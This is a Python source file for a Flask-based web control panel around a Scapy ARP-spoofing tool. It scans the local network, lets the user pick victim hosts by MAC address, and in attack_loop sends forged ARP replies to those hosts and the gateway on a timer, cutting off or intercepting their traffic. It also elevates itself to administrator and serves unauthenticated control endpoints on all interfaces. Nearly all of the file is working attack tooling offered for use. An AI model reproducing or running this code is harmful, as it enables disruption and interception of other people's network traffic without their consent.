import os
import subprocess
import threading
import time
import ctypes
import sys
import webbrowser

from flask import Flask, render_template, request, jsonify
from scapy.all import ARP, Ether, srp, sendp, conf, get_if_addr, get_if_list, get_if_hwaddr

try:
    from ArpIP import openlock
except ImportError:
    def openlock():
        print("ArpIP 模块缺失")

def resource_path(relative_path):
    if hasattr(sys, '_MEIPASS'):
        return os.path.join(sys._MEIPASS, relative_path)
    base_dir = os.path.dirname(os.path.abspath(__file__))
    return os.path.join(base_dir, relative_path)

app = Flask(__name__,
            template_folder=resource_path("templates"),
            static_folder=resource_path("static"))

state = {
    "is_running": False,
    "targets": [],               # [{mac, ip}, ...] 实际攻击对象，按 MAC 追踪
    "gateway_ip": "",
    "gateway_mac": None,
    "local_ip": "127.0.0.1",
    "whitelist": [],
    "bidirectional": True,
    "packet_count": 0,
    "iface_name": "",
    "iface": None,
    "interval": 2.0,
    "last_scan_clients": [],     # 最后一次扫描结果 (供前端同步)
    "previously_checked": [],    # 上次扫描勾选的 MAC 列表
    "available_ifaces": []
}

def run_as_admin():
    try:
        if not ctypes.windll.shell32.IsUserAnAdmin():
            script = sys.executable if getattr(sys, 'frozen', False) else sys.argv[0]
            ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, f'"{script}"', None, 1)
            sys.exit(0)
    except:
        pass

# def clear_arp_cache():
#     """每次发包前清空本机 ARP 缓存，防止缓存干扰伪造的 ARP 条目"""
#     try:
#         subprocess.run(["arp", "-d", "*"], capture_output=True, shell=True)
#     except:
#         pass

def repair_own_arp(gw_ip, gw_mac):
    """修复本机 ARP 表，防止自身被污染"""
    if not gw_mac:
        return
    mac_formatted = gw_mac.replace(":", "-").upper()
    subprocess.run(["arp", "-s", gw_ip, mac_formatted], capture_output=True)

def get_available_ifaces():
    """获取系统中所有可用网卡列表"""
    ifaces = []
    try:
        raw_list = get_if_list()
        for name in raw_list:
            try:
                ip = get_if_addr(name)
                mac = get_if_hwaddr(name)
                if ip and ip != "0.0.0.0" and mac:
                    is_loopback = ip.startswith("127.")
                    ifaces.append({"name": name, "ip": ip, "mac": mac, "is_loopback": is_loopback})
            except:
                pass
    except:
        pass
    if not ifaces:
        try:
            name = str(conf.iface)
            ip = get_if_addr(conf.iface)
            mac = get_if_hwaddr(conf.iface)
            ifaces.append({"name": name, "ip": ip, "mac": mac, "is_loopback": ip.startswith("127.")})
        except:
            ifaces.append({"name": str(conf.iface), "ip": "0.0.0.0", "mac": "00:00:00:00:00:00", "is_loopback": False})
    return ifaces

def auto_select_best_iface(ifaces):
    """自动选择最佳网卡（优先选有默认路由的、非回环的）"""
    best = None
    best_score = -1
    for iface in ifaces:
        score = 0
        if not iface["is_loopback"]:
            score += 10
        ip = iface["ip"]
        if ip and ip != "0.0.0.0" and not ip.startswith("169.254"):
            score += 5
        try:
            route = conf.route.route("0.0.0.0")
            if route and len(route) > 2:
                if str(route[0]) == iface["name"]:
                    score += 20
        except:
            pass
        if score > best_score:
            best_score = score
            best = iface
    if best:
        return best
    for iface in ifaces:
        if not iface["is_loopback"]:
            return iface
    return ifaces[0] if ifaces else {"name": str(conf.iface), "ip": "0.0.0.0", "mac": "00:00:00:00:00:00"}

def init_network():
    try:
        ifaces = get_available_ifaces()
        state["available_ifaces"] = ifaces
        best = auto_select_best_iface(ifaces)
        state["local_ip"] = best["ip"]
        state["iface_name"] = best["name"]
        state["iface"] = best["name"]
        gw = conf.route.route("0.0.0.0")[2]
        if gw and gw != "0.0.0.0":
            state["gateway_ip"] = gw
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw), timeout=2, verbose=False, retry=1)
            if ans:
                state["gateway_mac"] = ans[0][1].hwsrc
    except:
        pass

def attack_loop():
    iface = state.get("iface")
    count = 0
    loop = 0

    # 从 targets 恢复 MAC→IP 映射
    mac_to_ip = {}
    for t in state["targets"]:
        mac_to_ip[t["mac"]] = t["ip"]

    while state["is_running"]:
        try:
            # 每 5 轮刷新目标 IP + 修复本机 ARP
            if loop % 5 == 0:
                network = ".".join(state["local_ip"].split('.')[:-1]) + ".0/24"
                ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                             timeout=1, iface=iface, verbose=False, retry=0)
                refreshed = {}
                for _, rcv in ans:
                    if rcv.hwsrc in mac_to_ip:
                        refreshed[rcv.hwsrc] = rcv.psrc
                for mac, new_ip in refreshed.items():
                    if new_ip != mac_to_ip.get(mac):
                        mac_to_ip[mac] = new_ip
                if state["gateway_mac"]:
                    repair_own_arp(state["gateway_ip"], state["gateway_mac"])

            current_wl = state["whitelist"] + [state["gateway_ip"], state["local_ip"]]
            for mac, current_ip in list(mac_to_ip.items()):
                if current_ip in current_wl:
                    continue
                p1 = Ether(dst=mac) / ARP(op=2, pdst=current_ip, hwdst=mac, psrc=state["gateway_ip"])
                sendp(p1, iface=iface, verbose=False)
                if state["bidirectional"] and state["gateway_mac"]:
                    p2 = Ether(dst=state["gateway_mac"]) / ARP(op=2, pdst=state["gateway_ip"],
                                                               hwdst=state["gateway_mac"], psrc=current_ip)
                    sendp(p2, iface=iface, verbose=False)
                count += (2 if state["bidirectional"] else 1)

            state["packet_count"] = count
            loop += 1
            time.sleep(state["interval"])
        except Exception:
            break
    state["is_running"] = False

@app.route('/api/quit', methods=['POST'])
def quit_server():
    threading.Timer(0.5, lambda: os._exit(0)).start()
    return {"status": "正在强制退出..."}

@app.route('/')
def index():
    whitelist_str = ', '.join(state["whitelist"])
    return render_template('index.html', info=state, whitelist_str=whitelist_str)

@app.route('/api/scan', methods=['POST'])
def scan():
    state["gateway_ip"] = request.json.get('gateway_ip') or ""
    state["whitelist"] = request.json.get('whitelist', [])
    wl_ips = state["whitelist"] + [state["gateway_ip"], state["local_ip"]]

    gw_ip = state["gateway_ip"]
    if not gw_ip or gw_ip == "0.0.0.0":
        if state["local_ip"] and state["local_ip"] != "127.0.0.1":
            gw_ip = ".".join(state["local_ip"].split('.')[:-1]) + ".1"
            state["gateway_ip"] = gw_ip
        else:
            return jsonify([])

    network = ".".join(gw_ip.split('.')[:-1]) + ".0/24"
    iface = state.get("iface")

    # 快速扫描 — 一次完成，从结果中提取网关 MAC
    ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=network),
                 timeout=2, verbose=False, retry=1, iface=iface)

    if len(ans) == 0 and state["local_ip"] != "127.0.0.1":
        alt_network = ".".join(state["local_ip"].split('.')[:-1]) + ".0/24"
        if alt_network != network:
            ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=alt_network),
                         timeout=2, verbose=False, retry=1, iface=iface)

    # 从扫描结果提取网关 MAC
    gw_mac = None
    for _, rcv in ans:
        if rcv.psrc == gw_ip:
            gw_mac = rcv.hwsrc
            break
    if not gw_mac:
        ans_gw, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=gw_ip),
                        timeout=2, verbose=False, retry=1, iface=iface)
        gw_mac = ans_gw[0][1].hwsrc if ans_gw else None
    state["gateway_mac"] = gw_mac

    # 保存之前勾选的 MAC 列表
    previously_checked = state.get("previously_checked", [])

    clients = []
    found_ips = set()
    for _, rcv in ans:
        ip, mac = rcv.psrc, rcv.hwsrc
        if ip in found_ips:
            continue
        found_ips.add(ip)
        is_safe = ip in wl_ips or (gw_mac and mac == gw_mac) or ip == state["local_ip"]
        was_checked = mac in previously_checked and not is_safe
        role = ""
        if ip == state["local_ip"]:
            role = "管理"
        elif ip == gw_ip:
            role = "房主"
        clients.append({
            "ip": ip,
            "mac": mac.upper(),
            "role": role,
            "is_safe": is_safe,
            "checked": was_checked
        })

    state["last_scan_clients"] = clients
    # 更新 previously_checked：清除不在本次结果中的过时 MAC
    current_macs = {c["mac"].lower() for c in clients}
    state["previously_checked"] = [m for m in previously_checked if m.lower() in current_macs]
    return jsonify(clients)

@app.route('/api/update_whitelist', methods=['POST'])
def update_whitelist():
    state["whitelist"] = request.json.get('whitelist', [])
    return jsonify({"status": "updated"})

@app.route('/api/update_targets', methods=['POST'])
def update_targets():
    """按 MAC 更新 targets（客户端传 {mac, ip, checked}）"""
    new_targets = request.json.get('targets', [])
    state["targets"] = [{"mac": t["mac"], "ip": t["ip"]} for t in new_targets if t.get("checked")]
    # 保存当前勾选的 MAC 列表（用于下次扫描恢复）
    state["previously_checked"] = [t["mac"] for t in new_targets if t.get("checked")]
    return jsonify({"status": "targets updated"})

@app.route('/api/update_config', methods=['POST'])
def update_config():
    data = request.json
    if 'bidirectional' in data:
        state["bidirectional"] = data['bidirectional']
    if 'interval' in data:
        try:
            new_interval = float(data['interval'])
            if 0.1 <= new_interval <= 999.0:
                state["interval"] = new_interval
        except ValueError:
            pass
    return jsonify({"status": "config updated"})

@app.route('/api/control', methods=['POST'])
def control():
    data = request.json
    if data['action'] == "start":
        # 按 MAC 保存 targets
        raw_targets = data.get('targets', [])
        state["targets"] = [{"mac": t["mac"], "ip": t["ip"]} for t in raw_targets if t.get("checked")]
        state["bidirectional"] = data['bidirectional']
        state["whitelist"] = data['whitelist']
        if 'interval' in data:
            try:
                state["interval"] = float(data['interval'])
            except ValueError:
                pass
        if not state["is_running"] and state["targets"]:
            state["is_running"] = True
            state["packet_count"] = 0
            threading.Thread(target=attack_loop, daemon=True).start()
    else:
        state["is_running"] = False
    return jsonify({"status": "success", "running": state["is_running"]})

@app.route('/api/openlock', methods=['POST'])
def handle_openlock():
    threading.Thread(target=openlock, daemon=True).start()
    return jsonify({"status": "launched"})

@app.route('/api/status')
def get_status():
    return jsonify({"count": state["packet_count"], "running": state["is_running"]})

@app.route('/api/state')
def get_full_state():
    target_ips = [t["ip"] for t in state["targets"]]
    return jsonify({
        "running": state["is_running"],
        "targets": target_ips,
        "whitelist": state["whitelist"],
        "bidirectional": state["bidirectional"],
        "interval": state["interval"],
        "packet_count": state["packet_count"],
        "gateway_ip": state["gateway_ip"],
        "local_ip": state["local_ip"],
        "iface_name": state["iface_name"],
        "clients": state["last_scan_clients"]
    })

if __name__ == "__main__":
    run_as_admin()
    init_network()
    webbrowser.open("http://127.0.0.1:9178")
    app.run(host='0.0.0.0', port=9178)